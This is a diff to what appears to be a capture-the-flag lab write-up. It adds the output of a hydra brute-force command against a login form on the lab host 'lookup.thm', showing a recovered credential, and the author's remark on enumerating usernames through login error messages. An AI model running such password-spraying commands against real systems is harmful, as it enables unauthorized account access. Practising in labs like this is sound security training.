@@ -253,7 +253,12 @@ Finished
 ```
 hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -IV -t 64
 ```
+```
+[80][http-post-form] host: lookup.thm   login: jose   password: password123
+```
 
+> [!note]
+> Weird how that worked, admin login error messages gave away the password but somehow it gives the password instead of username first so first time i enumerated a username.
 
 
 
